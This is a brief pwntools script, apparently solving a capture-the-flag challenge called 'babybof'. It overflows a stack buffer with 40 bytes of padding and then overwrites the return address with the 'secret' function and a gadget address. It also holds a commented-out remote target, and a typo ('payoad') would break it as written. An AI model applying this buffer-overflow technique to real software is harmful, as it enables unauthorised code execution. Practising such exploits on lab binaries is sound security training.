from pwn import *

exe = ELF("./babybof", checksec=False)
p = process(exe.path)

# p = remote('61.28.236.247', 32887)

payload = b'A' * 40
payload += p64(exe.symbols['secret'])
payoad += p64(0x0000000000401313)
input()

p.sendlineafter(':', payload)

output = p.recvall().decode(errors="ignore")
print(output)